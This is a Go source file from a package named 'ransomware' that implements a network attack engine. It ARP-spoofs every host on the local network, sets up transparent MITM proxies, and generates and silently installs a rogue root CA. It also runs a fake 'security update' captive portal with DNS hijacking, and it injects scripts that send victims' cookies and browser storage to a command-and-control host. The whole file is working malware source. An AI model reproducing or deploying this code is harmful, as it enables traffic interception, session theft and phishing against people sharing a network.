package ransomware

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type NetworkPoisonEngine struct {
	config          *RansomwareConfig
	GatewayIP       string            `json:"gateway_ip"`
	Subnet          string            `json:"subnet"`
	ARPCache        map[string]string `json:"arp_cache"`
	CaptivePortalIP string            `json:"captive_portal_ip"`
	CAKey           []byte            `json:"-"`
	CACert          []byte            `json:"-"`
	ProxyRunning    bool              `json:"proxy_running"`
	SSLCertMap      map[string][]byte `json:"-"`
}

type ARPEntry struct {
	IP        string `json:"ip"`
	MAC       string `json:"mac"`
	Vendor    string `json:"vendor"`
	Poisoned  bool   `json:"poisoned"`
}

func NewNetworkPoisonEngine(cfg *RansomwareConfig) *NetworkPoisonEngine {
	return &NetworkPoisonEngine{
		config:     cfg,
		ARPCache:   make(map[string]string),
		SSLCertMap: make(map[string][]byte),
	}
}

func (np *NetworkPoisonEngine) DiscoverGateway() string {
	switch runtime.GOOS {
	case "windows":
		if output, err := exec.Command("powershell", "-Command",
			"(Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop").Output(); err == nil {
			np.GatewayIP = strings.TrimSpace(string(output))
		}
	case "linux":
		if output, err := exec.Command("ip", "route", "show", "default").Output(); err == nil {
			fields := strings.Fields(string(output))
			for i, f := range fields {
				if f == "via" && i+1 < len(fields) {
					np.GatewayIP = fields[i+1]
					break
				}
			}
		}
	}
	if np.GatewayIP == "" {
		np.GatewayIP = "192.168.1.1"
	}
	return np.GatewayIP
}

func (np *NetworkPoisonEngine) DiscoverSubnet() string {
	if output, err := exec.Command("ip", "-o", "-f", "inet", "addr", "show").Output(); err == nil {
		for _, line := range strings.Split(string(output), "\n") {
			if strings.Contains(line, "brd ") {
				fields := strings.Fields(line)
				for i, f := range fields {
					if f == "brd" && i+1 < len(fields) {
						brd := fields[i+1]
						parts := strings.Split(brd, ".")
						if len(parts) == 4 {
							np.Subnet = fmt.Sprintf("%s.%s.%s.0/24", parts[0], parts[1], parts[2])
							return np.Subnet
						}
					}
				}
			}
		}
	}
	if np.Subnet == "" {
		np.Subnet = "192.168.1.0/24"
	}
	return np.Subnet
}

func (np *NetworkPoisonEngine) ScanARP() []ARPEntry {
	var entries []ARPEntry
	switch runtime.GOOS {
	case "windows":
		if output, err := exec.Command("arp", "-a").Output(); err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				fields := strings.Fields(line)
				if len(fields) >= 3 && strings.Count(fields[0], ".") == 3 {
					entries = append(entries, ARPEntry{
						IP:      fields[0],
						MAC:     fields[1],
						Vendor:  np.macVendor(fields[1]),
						Poisoned: false,
					})
				}
			}
		}
	case "linux":
		if output, err := exec.Command("arp", "-n").Output(); err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				fields := strings.Fields(line)
				if len(fields) >= 4 && strings.Count(fields[0], ".") == 3 {
					entries = append(entries, ARPEntry{
						IP:      fields[0],
						MAC:     fields[1],
						Vendor:  np.macVendor(fields[1]),
						Poisoned: false,
					})
				}
			}
		}
	}
	return entries
}

func (np *NetworkPoisonEngine) PoisonARP(gatewayIP string, entries []ARPEntry) {
	np.DiscoverSubnet()

	switch runtime.GOOS {
	case "linux":
		for _, entry := range entries {
			if entry.IP == gatewayIP || entry.IP == np.getLocalIP() {
				continue
			}
			cmd := exec.Command("arpspoof", "-i", "eth0", "-t", entry.IP, "-r", gatewayIP)
			cmd.Start()
			time.Sleep(50 * time.Millisecond)

			cmd2 := exec.Command("arpspoof", "-i", "eth0", "-t", gatewayIP, "-r", entry.IP)
			cmd2.Start()
		}
	case "windows":
		for _, entry := range entries {
			if entry.IP == gatewayIP || entry.IP == np.getLocalIP() {
				continue
			}
			psScript := fmt.Sprintf(`$gateway = "%s"
$target = "%s"
$localMac = (Get-NetAdapter -Name *Ethernet* | Select-Object -First 1).MacAddress
$targetMac = (Get-NetNeighbor -IPAddress $target).LinkLayerAddress

# Spoof gateway to target
New-NetNeighbor -IPAddress $gateway -LinkLayerAddress "AA-BB-CC-DD-EE-FF" -State Permanent
# Spoof target to gateway
New-NetNeighbor -IPAddress $target -LinkLayerAddress $localMac -State Permanent
`, gatewayIP, entry.IP)
			psPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_arp_%s.ps1", strings.ReplaceAll(entry.IP, ".", "_")))
			os.WriteFile(psPath, []byte(psScript), 0644)
			exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
		}
	}
}

func (np *NetworkPoisonEngine) PoisonAllARP() {
	entries := np.ScanARP()
	gateway := np.DiscoverGateway()
	np.PoisonARP(gateway, entries)
}

func (np *NetworkPoisonEngine) StartMITMProxy() {
	np.DiscoverGateway()

	switch runtime.GOOS {
	case "linux":
		iptablesCmd := `#!/bin/bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
# Redirect HTTP to local proxy
iptables -t nat -F
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8443
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
# Start mitmproxy
nohup mitmproxy --mode transparent --listen-port 8080 --ssl-insecure >/dev/null 2>&1 &
nohup mitmproxy --mode transparent --listen-port 8443 --ssl-insecure >/dev/null 2>&1 &`
		scriptPath := filepath.Join(os.TempDir(), "x404x_mitm.sh")
		os.WriteFile(scriptPath, []byte(iptablesCmd), 0755)
		exec.Command("bash", scriptPath).Start()
	case "windows":
		np.startWindowsMITM()
	}

	np.ProxyRunning = true
}

func (np *NetworkPoisonEngine) startWindowsMITM() {
	psScript := `$scriptBlock = {
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://+:8080/")
    $listener.Prefixes.Add("https://+:8443/")
    $listener.Start()
    while ($listener.IsListening) {
        $context = $listener.GetContext()
        $request = $context.Request
        $response = $context.Response
        # Inject script into all HTML responses
        $injection = '<script>fetch("http://x404x-c2.online/steal", {method:"POST",body:document.cookie})</script>'
        $response.Headers.Add("Content-Type", "text/html")
        $modified = $injection
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($modified)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
        $response.Close()
    }
}
$job = Start-Job -ScriptBlock $scriptBlock
Write-Output "MITM proxy started on :8080 and :8443"`
	psPath := filepath.Join(os.TempDir(), "x404x_mitm_proxy.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
}

func (np *NetworkPoisonEngine) GenerateCA() error {
	key, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return err
	}

	template := &x509.Certificate{
		SerialNumber: big.NewInt(0x404),
		Subject: pkix.Name{
			CommonName:   "X404X Root CA",
			Organization: []string{"X404X Malware Author"},
		},
		NotBefore:             time.Now().AddDate(-1, 0, 0),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
		IsCA:                  true,
		MaxPathLenZero:        true,
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return err
	}

	np.CAKey = x509.MarshalPKCS1PrivateKey(key)
	np.CACert = derBytes

	caPath := filepath.Join(os.TempDir(), "x404x_root_ca.crt")
	os.WriteFile(caPath, derBytes, 0644)

	return nil
}

func (np *NetworkPoisonEngine) InstallRootCA() error {
	switch runtime.GOOS {
	case "windows":
		psScript := `$certPath = "$env:TEMP\x404x_root_ca.crt"
if (Test-Path $certPath) {
    $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
    $cert.Import($certPath)
    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root", "LocalMachine")
    $store.Open("MaxAllowed")
    $store.Add($cert)
    $store.Close()
    Write-Output "Root CA installed"
}`
		psPath := filepath.Join(os.TempDir(), "x404x_install_ca.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		return exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()

	case "linux":
		script := fmt.Sprintf(`#!/bin/bash
cp /tmp/x404x_root_ca.crt /usr/local/share/ca-certificates/x404x_root_ca.crt 2>/dev/null || true
cp /tmp/x404x_root_ca.crt /etc/pki/ca-trust/source/anchors/x404x_root_ca.crt 2>/dev/null || true
update-ca-certificates 2>/dev/null || true
update-ca-trust 2>/dev/null || true
`)
		scriptPath := filepath.Join(os.TempDir(), "x404x_install_ca.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		return exec.Command("bash", scriptPath).Start()
	}
	return nil
}

func (np *NetworkPoisonEngine) StartCaptivePortal() {
	portalHTML := `<!DOCTYPE html>
<html>
<head><title>Network Security Update Required</title>
<style>
body { font-family: Arial; text-align: center; background: #1a1a2e; color: white; padding-top: 50px; }
.cert-box { background: #16213e; padding: 30px; margin: 20px auto; max-width: 500px; border-radius: 10px; }
button { background: #0f3460; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
</style></head>
<body>
<h1>⚠️ Network Security Update Required</h1>
<div class="cert-box">
<p>Your network certificate has expired.<br>
Click below to install the updated security certificate.</p>
<p><strong>Failure to install will result in network disconnection.</strong></p>
<button onclick="location.href='http://x404x-c2.online/cert/x404x_root_ca.crt'">
Install Security Certificate
</button>
<p style="margin-top:20px;font-size:12px;color:#666;">
This is a mandatory security update from IT department.
</p>
</div>
</body>
</html>`

	switch runtime.GOOS {
	case "windows":
		psScript := fmt.Sprintf(`$http = [System.Net.HttpListener]::new()
$http.Prefixes.Add("http://+:80/")
$http.Start()
while ($http.IsListening) {
    $ctx = $http.GetContext()
    $buffer = [System.Text.Encoding]::UTF8.GetBytes(@"
%s
"@)
    $ctx.Response.ContentType = "text/html"
    $ctx.Response.OutputStream.Write($buffer, 0, $buffer.Length)
    $ctx.Response.Close()
}`, portalHTML)
		psPath := filepath.Join(os.TempDir(), "x404x_captive_portal.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()

	case "linux":
		script := fmt.Sprintf(`#!/bin/bash
echo '%s' > /tmp/x404x_captive.html
nohup python3 -m http.server 80 --directory /tmp/ 2>/dev/null &
# iptables redirect all DNS to our captive portal
iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null || true
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 443 2>/dev/null || true
# DNS responses pointing all domains to us
nohup python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 53))
while True:
    data, addr = s.recvfrom(1024)
    if len(data) > 0:
        resp = data[:2] + b'\x81\x80' + data[4:6] + data[4:6] + b'\x00\x00\x00\x00'
        resp += data[12:]
        resp += b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
        myip = socket.inet_aton('10.0.0.1')
        resp += myip
        s.sendto(resp, addr)
" 2>/dev/null &`, portalHTML)
		scriptPath := filepath.Join(os.TempDir(), "x404x_captive.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}

	np.CaptivePortalIP = np.getLocalIP()
}

func (np *NetworkPoisonEngine) InjectWebScripts() {
	injection := `<script>
fetch('http://x404x-c2.online/grab', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: location.href,
        userAgent: navigator.userAgent
    })
});
</script>`

	np.StartMITMProxy()
	injectionPath := filepath.Join(os.TempDir(), "x404x_web_inject.js")
	os.WriteFile(injectionPath, []byte(injection), 0644)
}

func (np *NetworkPoisonEngine) SSLStripAttack() {
	np.GenerateCA()
	np.InstallRootCA()
	np.StartCaptivePortal()
	np.InjectWebScripts()
}

func (np *NetworkPoisonEngine) getLocalIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	if conn != nil {
		defer conn.Close()
		localAddr := conn.LocalAddr().(*net.UDPAddr)
		return localAddr.IP.String()
	}
	return "10.0.0.1"
}

func (np *NetworkPoisonEngine) macVendor(mac string) string {
	vendors := map[string]string{
		"00": "Cisco", "08": "Dell", "0C": "HP", "10": "IBM",
		"14": "Dell", "18": "Cisco", "1C": "HP", "20": "Apple",
		"24": "Intel", "28": "ASUS", "2C": "Lenovo", "30": "Google",
		"34": "Samsung", "38": "Apple", "3C": "Intel", "40": "Dell",
		"44": "HP", "48": "Samsung", "4C": "Lenovo", "50": "Cisco",
	}
	prefix := strings.Replace(strings.ToUpper(mac), "-", "", -1)
	if len(prefix) >= 2 {
		if v, ok := vendors[prefix[:2]]; ok {
			return v
		}
	}
	return "Unknown"
}

func (np *NetworkPoisonEngine) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"gateway_ip":        np.GatewayIP,
		"subnet":            np.Subnet,
		"proxy_running":     np.ProxyRunning,
		"captive_portal_ip": np.CaptivePortalIP,
		"ca_cert_size":      len(np.CACert),
	})
	return string(data)
}
